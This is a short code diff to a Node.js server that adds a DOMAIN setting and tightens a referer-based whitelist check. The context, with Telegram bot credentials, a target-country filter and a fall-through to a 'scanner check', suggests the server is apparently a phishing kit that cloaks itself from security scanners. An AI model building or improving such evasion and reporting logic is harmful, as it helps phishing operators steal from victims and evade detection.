@@ -14,6 +14,7 @@ const PORT = process.env.PORT || 3000;
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
 const TARGET_COUNTRY = process.env.TARGET_COUNTRY || ''; // e.g., 'US'
+const DOMAIN = process.env.DOMAIN || '';
 
 const requestTimestamps = new Map();
 
@@ -180,8 +181,7 @@ function isWhitelisted(req) {
     if (!referer) return false; // Let it fall through to scanner check
     
     // Click from own domain (multi-page flow)
-    if (referer.includes(process.env.DOMAIN)) return true;
-    
+if (DOMAIN && referer.includes(DOMAIN)) return true;
     return false;
 }
 
